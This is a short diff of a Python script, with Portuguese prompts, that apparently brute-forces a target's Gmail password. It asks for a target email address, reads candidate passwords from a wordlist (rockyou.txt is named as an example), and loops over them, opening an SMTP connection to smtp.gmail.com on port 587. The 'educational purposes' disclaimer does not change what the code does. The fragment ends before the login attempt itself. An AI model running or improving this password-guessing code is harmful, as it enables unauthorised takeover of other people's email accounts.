@@ -26,14 +26,10 @@ print('\n - OBS: Script feito para "Fins Educativos".')
 ####################################################################################
 
 user = input('\n - Digite aqui o E-mail alvo: ')
-try:
-    arquivo = open("lista.txt", "r")
-except:
-    print('\n - Ex.: /usr/share/wordlists/rockyou.txt')
-    wordlist = input(' - Digite aqui a Wordlist: ')
-    arquivo = open(wordlist, "r")
+arquivo = open("lista.txt", "r")
 for linha in arquivo.readlines():
     try:
+        
         smtpclient = smtplib.SMTP('smtp.gmail.com', 587)
         smtpclient.ehlo()
         smtpclient.starttls()
